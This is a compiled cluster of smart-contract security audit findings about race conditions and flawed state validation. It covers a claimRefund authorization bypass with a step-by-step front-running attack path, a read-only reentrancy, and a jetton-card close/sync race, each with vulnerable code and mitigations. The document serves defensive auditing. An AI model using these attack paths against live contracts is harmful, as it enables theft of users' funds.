**Rank:** #133  
**Count:** 107  

## Label
Race conditions and improper state validation enable attackers to bypass withdrawal proofs, manipulate balances, or exploit timing to withdraw funds without valid conditionsâ€”leading to unauthorized fund access or loss.

## Cluster Information
- **Total Findings:** 107

## Examples

### Example 1

**Auto Label:** Reentrancy vulnerabilities arise from improper state updates and external calls, allowing attackers to recursively trigger functions and drain funds before state changes are finalized.

### Summary

The `claimRefund` function in both `GatewayTransferNative.sol` and `GatewayCrossChain.sol` contains a critical authorization flaw that allows any user to claim refunds intended for non-EVM chains (such as Bitcoin). This occurs due to improper access control logic that fails to properly validate the caller's authority when the refund is for a non-EVM address.


### Root Cause

The vulnerability stems from flawed conditional logic in the [`claimRefund`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L571) function:

```solidity
function claimRefund(bytes32 externalId) external {
    RefundInfo storage refundInfo = refundInfos[externalId];

    address receiver = msg.sender;  // Default to caller
    if(refundInfo.walletAddress.length == 20) {
        receiver = address(uint160(bytes20(refundInfo.walletAddress)));
    }
    require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER");
    // ... transfer logic
}
```

**The problem**: When `walletAddress.length != 20` (non-EVM addresses), `receiver` remains `msg.sender`, making the authorization check `require(bots[msg.sender] || msg.sender == msg.sender)`, which simplifies to `require(bots[msg.sender] || true)` - always passing for any caller.


### Internal Pre-conditions

 Attacker monitors `EddyCrossChainRefund` events for refunds with non-EVM addresses

### External Pre-conditions

NA

### Attack Path

1. **Monitoring**: Attacker monitors `EddyCrossChainRefund` events for refunds with non-EVM addresses
2. **Identification**: Filter for refunds where `walletAddress.length != 20` (Bitcoin, Solana, etc.)
3. **Front-running**: Submit `claimRefund` transaction with higher gas to execute before legitimate bot
4. **Exploitation**: Due to flawed logic, the require statement passes and funds are transferred to attacker
5. **Theft Complete**: Attacker receives tokens intended for legitimate users on non-EVM chains


### Impact

Complete theft of all non-EVM chain refunds with minimal cost (only gas fees).

### Mitigation

Implement proper authorization checks that differentiate between EVM and non-EVM addresses.

##### Description
The [`getTraderBalance`](https://github.com/longgammalabs/hanji-contracts/blob/09b6188e028650b9c1758010846080c5f8c80f8e/src/OnchainLOB.sol#L154) function is vulnerable to read-only reentrancy attacks, especially with ERC-777 tokens. This vulnerability arises because the trader's balance updates in storage occur after token transfers, potentially allowing a reentrancy exploit.

The issue is classified as **high** severity because it causes discrepancies between the actual balance and the returned value from the view function, which could lead to critical issues and vulnerabilities in the project's integrations.

##### Recommendation
We recommend updating the trader's balance prior to transferring the external tokens to mitigate the read-only reentrancy risk.

## Diï¬ƒculty: Low

## Type: Data Validation

## Description
A userâ€™s jetton card balance can become permanently locked due to a race condition between the `op::close` operation and the `op::start_balance_sync` operation. The user or the controller of the jetton card contract can initiate the closure of the payment card. When a card is closed, the entire leftover balance is withdrawn to the user and the treasure contract, depending on the value of the state variables that track each balance.

```javascript
// Perform completition
if (complete) {
    var balanceA = ctx_deposited_a + ctx_transferred_b - ctx_transferred_a - ctx_withdrawn_a;
    var balanceB = ctx_deposited_b + ctx_transferred_a - ctx_transferred_b - ctx_withdrawn_b;

    if (balanceA > 0) {
        ctx_withdrawn_a = ctx_withdrawn_a + balanceA;
        do_send_token_message(ctx_min_tons_for_token_fee, ctx_min_tons_for_token_forward, ctx_address_a, sender_address, send_mode::default, callback::withdraw, query_id, balanceA, extras);
    }

    if (balanceB > 0) {
        ctx_withdrawn_b = ctx_withdrawn_b + balanceB;
        do_send_token_message(ctx_min_tons_for_token_fee, ctx_min_tons_for_token_forward, ctx_address_b, sender_address, send_mode::default, callback::withdraw, query_id, balanceB, extras);
    }
}
```
*Figure 2.1: A snippet of the `do_uncooperative_close` function (holders-contracts/packages/ton/contracts/jetton-card-v3.fc#L451â€“L463)*

However, the `op::close` operation does not check if a balance sync is currently in progress. Since the `op::start_balance_sync` operation is callable by anyone, and it transfers the entire jetton balance of the contract to itself, a race condition can cause the `op::close` operationâ€™s withdrawal to silently fail. In this case, the user and treasure contract will receive no jettons and all of the jettons will become stuck in the jetton card contractâ€™s jetton wallet. The only way to remedy this is to upgrade the jetton card contractâ€™s code.

This issue was fixed in an earlier version of the jetton card contract and was later reintroduced in this version.

## Exploit Scenario
Alice holds $10,000 of USDC in her jetton card and initiates the closure procedure for the card. Eve notices this and waits for the closure delay to pass. Once it has passed, she calls the `op::start_balance_sync` operation once per block. The transfer from this operation lands in the same block as the closure withdrawal but is executed first, causing the withdrawal transfer to silently fail. Aliceâ€™s funds become permanently locked in the jetton card contract.

## Recommendations
- **Short term**: If a card is closed, allow the user to withdraw their jettons by using the `op::withdraw_jettons` operation. Add a check to the close operation so it throws an error if a sync is in progress.
- **Long term**: Create sequence diagrams for each message flow in the system contracts and compare the message flows that update or rely on the same contract state. This will make it easier to discover race conditions. Implement tracking of known vulnerabilities present in past versions of contracts that are in active development, and add tests for each vulnerability in order to ensure past vulnerabilities are not reintroduced in future versions.
